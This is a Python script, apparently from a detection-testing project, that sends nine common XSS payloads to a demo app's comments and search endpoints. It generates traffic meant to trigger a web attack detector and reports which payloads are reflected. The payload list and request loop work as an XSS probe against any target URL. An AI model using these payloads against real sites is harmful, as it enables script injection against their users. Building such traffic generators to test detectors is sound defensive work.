"""XSS injection attack against the demo app.

Sends HTTP requests with XSS payloads to the comments endpoint.
Generates real traffic the scanner pushes into SENTINEL, triggering
the web attack detector.

Usage: python -m attacks.xss [--target http://demo-app:5000]
"""

from __future__ import annotations

import argparse
import time
from urllib import error, request

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "<iframe src='javascript:alert(1)'>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert('xss')>",
    "<input onfocus=alert('xss') autofocus>",
    "<marquee onstart=alert('xss')>",
    "<details open ontoggle=alert('xss')>",
]


def run(target: str, delay: float = 0.2, rounds: int = 2) -> int:
    target = target.rstrip("/")
    total = len(XSS_PAYLOADS) * rounds
    print(
        f"[xss] attacking {target}/comments with "
        f"{len(XSS_PAYLOADS)} payloads x{rounds} rounds ({total} requests)"
    )

    reflected = 0
    for round_idx in range(rounds):
        for payload in XSS_PAYLOADS:
            # POST XSS payload as a comment
            data = f"content={payload}".encode()
            req = request.Request(
                f"{target}/comments",
                data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                method="POST",
            )
            try:
                resp = request.urlopen(req, timeout=5)
                code = resp.getcode()
                body = resp.read().decode(errors="replace")[:200]
            except error.HTTPError as e:
                code = e.code
                body = ""
            except Exception:
                code = 0
                body = ""
            is_reflected = payload in body or "script" in body.lower()
            if is_reflected:
                reflected += 1
            print(
                f"  round {round_idx+1}  payload={payload[:35]:35s}  "
                f"status={code}  reflected={is_reflected}"
            )
            time.sleep(delay)

        # Also test GET-based XSS in search
        for payload in XSS_PAYLOADS[:3]:
            encoded = payload.replace(" ", "+")
            url = f"{target}/search?q={encoded}"
            try:
                resp = request.urlopen(request.Request(url), timeout=5)
                code = resp.getcode()
                body = resp.read().decode(errors="replace")[:100]
            except error.HTTPError as e:
                code = e.code
                body = ""
            except Exception:
                code = 0
                body = ""
            is_reflected = payload in body
            print(
                f"  round {round_idx+1}  search_xss={payload[:30]:30s}  "
                f"status={code}  reflected={is_reflected}"
            )
            time.sleep(delay)

    print(f"[xss] done: {total} requests, {reflected} payloads reflected")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:5000")
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument("--rounds", type=int, default=2)
    args = parser.parse_args()
    return run(args.target, delay=args.delay, rounds=args.rounds)


if __name__ == "__main__":
    raise SystemExit(main())
